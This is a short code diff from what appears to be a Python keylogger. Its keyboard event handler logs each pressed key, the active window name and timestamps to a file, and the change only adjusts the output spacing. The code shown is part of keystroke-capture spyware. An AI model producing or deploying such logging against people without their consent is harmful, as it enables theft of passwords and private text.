@@ -41,7 +41,7 @@ def onKeyboardEvent(event):
         Keyboard_input.write( "WindowName:%s\n" % event.WindowName)
         Keyboard_input.write( "Time:%s\n" % datetime.datetime.now())
         oldwindowsName = event.WindowName
-    Keyboard_input.write( "     Key:%s-%s  \n" % (event.Key, Now))
+    Keyboard_input.write( "     Key:%s        %s  \n" % (event.Key, Now))
     return True
 
 
